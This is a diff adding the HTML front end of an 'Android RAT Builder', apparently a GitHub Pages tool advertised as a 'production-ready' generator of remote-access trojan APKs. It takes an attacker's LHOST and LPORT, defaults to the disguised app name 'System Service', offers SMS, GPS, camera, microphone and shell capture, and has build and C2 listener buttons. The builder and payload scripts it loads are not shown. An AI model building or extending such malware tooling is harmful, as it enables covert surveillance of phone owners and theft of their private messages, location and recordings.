@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Android RAT Builder - GitHub Pages</title>
+    <link rel="stylesheet" href="style.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.10.1/jszip.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/FileSaver.js/2.0.0/FileSaver.min.js"></script>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <h1>🐺 <span class="glow">Android RAT Builder</span></h1>
+            <p>Production-ready APK generator | GitHub Pages hosted</p>
+        </header>
+
+        <div class="config-panel">
+            <div class="input-group">
+                <label>LHOST (Your IP/URL):</label>
+                <input type="text" id="lhost" value="YOUR_IP_HERE" placeholder="192.168.1.100 or tunnel.ngrok.io">
+            </div>
+            <div class="input-group">
+                <label>LPORT:</label>
+                <input type="number" id="lport" value="4444">
+            </div>
+            <div class="input-group">
+                <label>App Name:</label>
+                <input type="text" id="appname" value="System Service">
+            </div>
+        </div>
+
+        <div class="features-panel">
+            <h3>🔥 RAT Features</h3>
+            <label><input type="checkbox" id="sms" checked> SMS</label>
+            <label><input type="checkbox" id="gps" checked> GPS</label>
+            <label><input type="checkbox" id="camera" checked> Camera</label>
+            <label><input type="checkbox" id="mic" checked> Mic</label>
+            <label><input type="checkbox" id="shell" checked> Shell</label>
+        </div>
+
+        <div class="action-buttons">
+            <button onclick="generateAPK()">🚀 BUILD APK</button>
+            <button onclick="showListener()">📡 C2 LISTENER</button>
+        </div>
+
+        <div id="progress" class="progress-bar">
+            <div id="progress-fill"></div>
+        </div>
+
+        <div id="status" class="status"></div>
+        <div id="output" class="output"></div>
+        <div id="download-area" class="download-area"></div>
+    </div>
+
+    <script src="builder.js"></script>
+    <script src="rat.js"></script>
+</body>
+</html>
